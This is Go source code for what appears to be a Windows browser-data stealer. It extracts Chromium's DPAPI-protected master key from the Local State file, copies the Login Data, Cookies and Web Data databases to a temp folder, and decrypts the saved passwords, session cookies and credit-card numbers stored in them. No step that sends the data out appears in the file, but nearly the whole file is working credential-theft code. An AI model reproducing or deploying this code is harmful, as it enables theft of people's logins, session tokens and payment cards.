package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

type PASSWD struct {
	Url  string `json:"url"`
	User string `json:"username"`
	Pass string `json:"password"`
}

type CCARD struct {
	Name       string `json:"name"`
	Number     string `json:"number"`
	Expiration string `json:"exp"`
}

type COOKIE struct {
	Host  string `json:"url"`
	Name  string `json:"name"`
	Value string `json:"value"`
}

func getMasterKey(localStatePath string) ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil

}

func DecryptBlob(BLOB string, LocalState string) string {
	var output string

	if strings.HasPrefix(BLOB, "v10") { // Means it's Chrome v80 or higher
		BLOB = strings.Trim(BLOB, "v10")

		if string(masterKey) == "" { // It the masterkey hasn't been requested yet, then gets it.
			mkey, err := getMasterKey(LocalState)
			if err != nil {
				fmt.Println(err)
			}
			masterKey = mkey
		}

		ciphertext := []byte(BLOB)
		c, err := aes.NewCipher(masterKey)
		if err != nil {

			fmt.Println(err)
		}
		gcm, err := cipher.NewGCM(c)
		if err != nil {
			fmt.Println(err)
		}
		nonceSize := gcm.NonceSize()
		if len(ciphertext) < nonceSize {
			fmt.Println(err)
		}

		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			//fmt.Println(err) Commented because it dumps a bunch of shit to console.
		}
		if string(plaintext) != "" {
			output = string(plaintext)

		}
	} else { //Means it's chrome v. < 80
		pass, err := Decrypt([]byte(BLOB))
		if err != nil {
			log.Fatal(err)
		}

		output = string(pass)
	}

	return output
}

func GetCookies() []COOKIE {
	var output []COOKIE

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Network\\Cookies") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Network\\Cookies", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select host_key, name, encrypted_value from cookies")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var HOST string
			var NAME string
			var VALUE string

			err = rows.Scan(&HOST, &NAME, &VALUE)
			if err != nil {
				log.Fatal(err)
			}

			VALUE = DecryptBlob(VALUE, Path.LocalState)

			if VALUE != "" {
				output = append(output, COOKIE{
					Host:  NAME,
					Name:  NAME,
					Value: VALUE,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

	}

	return output
}

func GetPasswords() []PASSWD {

	var output []PASSWD

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Login Data") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select origin_url, username_value, password_value from logins")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var URL string
			var USERNAME string
			var PASSWORD string

			err = rows.Scan(&URL, &USERNAME, &PASSWORD)
			if err != nil {
				log.Fatal(err)
			}

			PASSWORD = DecryptBlob(PASSWORD, Path.LocalState)

			if PASSWORD != "" {
				output = append(output, PASSWD{
					Url:  URL,
					User: USERNAME,
					Pass: PASSWORD,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

		masterKey = []byte("")
	}

	return output
}

func GetCreditCards() []CCARD {

	var output []CCARD

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Web Data") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Web Data", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var NAME string
			var EXPM string
			var EXPY string
			var NUMBER string

			err = rows.Scan(&NAME, &EXPM, &EXPY, &NUMBER)
			if err != nil {
				log.Fatal(err)
			}

			NUMBER = DecryptBlob(NUMBER, Path.LocalState)

			if NUMBER != "" {
				output = append(output, CCARD{
					Name:       NAME,
					Expiration: fmt.Sprintf("%s/%s", EXPM, EXPY),
					Number:     NUMBER,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

	}

	return output
}
